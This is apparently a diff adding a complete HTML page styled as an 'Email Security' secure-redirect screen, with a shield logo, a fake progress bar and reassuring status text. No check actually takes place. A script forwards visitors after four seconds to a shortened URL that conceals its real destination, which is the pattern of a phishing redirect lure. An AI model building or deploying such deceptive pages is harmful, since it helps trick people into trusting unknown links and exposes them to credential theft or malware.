@@ -1,0 +1,197 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Email Security | Secure Redirect</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: "Segoe UI", Arial, sans-serif;
+    background: linear-gradient(135deg, #07172e, #102e50, #07172e);
+    color: #fff;
+    overflow: hidden;
+}
+
+.background {
+    position: fixed;
+    width: 600px;
+    height: 600px;
+    background: #1685ff;
+    filter: blur(180px);
+    opacity: .17;
+    border-radius: 50%;
+    animation: float 7s infinite alternate ease-in-out;
+}
+
+.container {
+    position: relative;
+    width: 90%;
+    max-width: 460px;
+    padding: 45px 35px;
+    text-align: center;
+    border: 1px solid rgba(255,255,255,.15);
+    border-radius: 22px;
+    background: rgba(255,255,255,.07);
+    backdrop-filter: blur(18px);
+    box-shadow: 0 25px 70px rgba(0,0,0,.3);
+    animation: appear 1s ease;
+}
+
+.logo {
+    width: 76px;
+    height: 76px;
+    margin: 0 auto 25px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 50%;
+    background: rgba(35,145,255,.15);
+    border: 1px solid rgba(80,170,255,.5);
+    animation: pulse 2s infinite;
+}
+
+.logo svg {
+    width: 39px;
+    height: 39px;
+    stroke: #64b5ff;
+}
+
+h1 {
+    font-size: 25px;
+    margin-bottom: 13px;
+    font-weight: 650;
+    letter-spacing: .3px;
+}
+
+.description {
+    color: #c3d3e5;
+    font-size: 14px;
+    line-height: 1.8;
+    margin-bottom: 28px;
+}
+
+.progress-container {
+    width: 100%;
+    height: 5px;
+    background: rgba(255,255,255,.15);
+    border-radius: 20px;
+    overflow: hidden;
+    margin-bottom: 17px;
+}
+
+.progress {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #2995ff, #75c5ff);
+    border-radius: 20px;
+    animation: loading 4s linear forwards;
+}
+
+.status {
+    font-size: 12px;
+    color: #a9c8e8;
+    letter-spacing: 1px;
+}
+
+.loader {
+    display: inline-block;
+    width: 7px;
+    height: 7px;
+    background: #56b2ff;
+    border-radius: 50%;
+    margin-right: 7px;
+    animation: blink 1s infinite;
+}
+
+.footer {
+    margin-top: 32px;
+    padding-top: 20px;
+    border-top: 1px solid rgba(255,255,255,.12);
+    font-size: 11px;
+    color: #819bb7;
+}
+
+@keyframes appear {
+    from { opacity: 0; transform: translateY(25px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes pulse {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(50,150,255,.2); }
+    50% { box-shadow: 0 0 25px 8px rgba(50,150,255,.2); }
+}
+
+@keyframes loading {
+    to { width: 100%; }
+}
+
+@keyframes blink {
+    50% { opacity: .2; }
+}
+
+@keyframes float {
+    to { transform: translate(100px, 60px); }
+}
+</style>
+</head>
+
+<body>
+
+<div class="background"></div>
+
+<div class="container">
+
+    <div class="logo">
+        <svg viewBox="0 0 24 24" fill="none"
+        stroke-width="1.7" stroke-linecap="round"
+        stroke-linejoin="round">
+            <path d="M12 22s8-4 8-11V5l-8-3-8 3v6c0 7 8 11 8 11z"/>
+            <path d="m9 12 2 2 4-4"/>
+        </svg>
+    </div>
+
+    <h1>Email Security</h1>
+
+    <p class="description">
+        Your secure destination is being prepared.
+        Please wait while the redirection process
+        is completed.
+    </p>
+
+    <div class="progress-container">
+        <div class="progress"></div>
+    </div>
+
+    <p class="status">
+        <span class="loader"></span>
+        SECURE REDIRECTION IN PROGRESS
+    </p>
+
+    <div class="footer">
+        Secure connection • Automated navigation
+    </div>
+
+</div>
+
+<script>
+const destination = "https://u.to/qzTiIg";
+
+setTimeout(function() {
+    window.location.replace(destination);
+}, 4000);
+</script>
+
+</body>
+</html>
